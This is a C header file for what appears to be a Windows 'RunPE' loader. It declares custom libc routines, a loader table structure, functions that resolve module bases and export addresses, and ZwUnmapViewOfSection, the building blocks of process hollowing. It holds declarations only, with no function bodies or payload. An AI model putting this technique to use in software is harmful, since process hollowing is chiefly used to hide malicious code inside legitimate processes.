#pragma once
#include <Windows.h>
#include <winternl.h>

/* libc.c */
int
libc_strcmp(const char* s1, const char* s2);
int
libc_wstrcmp(const wchar_t* s1, const wchar_t* s2);
int
libc_wstricmp(const wchar_t* s1, const wchar_t* s2);
wchar_t
libc_wtolower(const wchar_t c);
void
libc_memcpy(void* dst, const void* src, size_t n);
void
libc_memset(void* dst, const unsigned char c, size_t n);

/* dll.c */
typedef struct DLL_LDR_DATA_TABLE_ENTRY
{
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
  ULONG Flags;
  WORD LoadCount;
  WORD TlsIndex;
  union
  {
    LIST_ENTRY HashLinks;
    struct
    {
      PVOID SectionPointer;
      ULONG CheckSum;
    };
  };
  union
  {
    ULONG TimeDateStamp;
    PVOID LoadedImports;
  };
  void* EntryPointActivationContext;
  PVOID PatchInformation;
  LIST_ENTRY ForwarderLinks;
  LIST_ENTRY ServiceTagLinks;
  LIST_ENTRY StaticLinks;
} DLL_LDR_DATA_TABLE_ENTRY, *DLL_PLDR_DATA_TABLE_ENTRY;

PVOID
get_module_base(LPWSTR name);
PVOID
get_export_address(PBYTE module, LPSTR name);

/* runpe.c */
typedef NTSYSAPI NTSTATUS
ZwUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);